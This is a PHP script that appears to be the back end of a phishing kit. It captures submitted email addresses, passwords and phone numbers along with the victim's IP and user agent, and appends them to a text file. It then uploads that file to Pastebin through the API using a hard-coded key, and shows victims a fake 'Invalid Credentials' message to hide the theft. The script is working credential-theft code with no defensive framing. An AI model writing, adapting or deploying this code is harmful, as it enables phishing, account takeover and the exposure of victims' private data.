<?php
$email = trim($_POST['email']);
$password = trim($_POST['password']);
$phone = trim($_POST['phone']);
$outputFile = 'output.txt';

if ($email != null && $password != null && $phone != null) {
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "|----------| xLs |--------------|\n";

    $message .= "Online ID            : " . $email . "\n";
    $message .= "Passcode              : " . $password . "\n";
    $message .= "phone              : " . $phone . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $message .= "|----------- CrEaTeD bY JAH --------------|\n";

    // Append the message to a new line in the output file
    file_put_contents($outputFile, $message, FILE_APPEND | LOCK_EX);

    $signal = 'ok';
    $msg = 'Invalid Credentials';
} else if ($email != null && $password != null) {
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "|----------| xLs |--------------|\n";

    $message .= "Online ID            : " . $email . "\n";
    $message .= "Passcode              : " . $password . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $message .= "|----------- CrEaTeD bY JAH --------------|\n";

    // Append the message to a new line in the output file
    file_put_contents($outputFile, $message, FILE_APPEND | LOCK_EX);

    $signal = 'ok';
    $msg = 'Invalid Credentials';
}

// Create a new paste on Pastebin
$data = array(
    'api_dev_key' => 'rZBA4lEyPJ3fJpL9mk-DJ8x7ySAaVjPr',
    'api_option' => 'paste',
    'api_paste_code' => file_get_contents($outputFile)
);

$curl = curl_init('https://pastebin.com/api/api_post.php');
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec($curl);
curl_close($curl);

if ($response !== false) {
    // Extract the paste key from the response
    $pasteKey = trim($response);
    $pasteUrl = "https://pastebin.com/embed/$pasteKey";
    echo "<script src=\"$pasteUrl\"></script>";
} else {
    // Failed to create the Pastebin paste
    echo "Error: Failed to create Pastebin paste.";
}
?>
